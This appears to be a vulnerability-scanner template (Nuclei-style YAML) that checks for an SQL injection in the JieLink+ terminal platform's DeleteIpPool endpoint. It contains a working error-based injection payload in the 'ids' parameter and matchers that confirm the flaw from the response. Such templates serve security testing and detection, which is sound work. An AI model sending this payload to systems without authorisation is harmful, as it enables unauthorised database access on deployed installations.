id: poc-yaml-jielink-plus-deleteippool-sqli

info:
  name: JieLink+ Intelligent Terminal Operation Platform DeleteIpPool SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /project/IPPool/DeleteIpPool HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        ids=-99 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,{{t2}},0x7e,0x7e))s), 8446744073709551610, 8446744073709551610)))&syncFlag=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "value"
          - "{{t2}}"
          - "out"
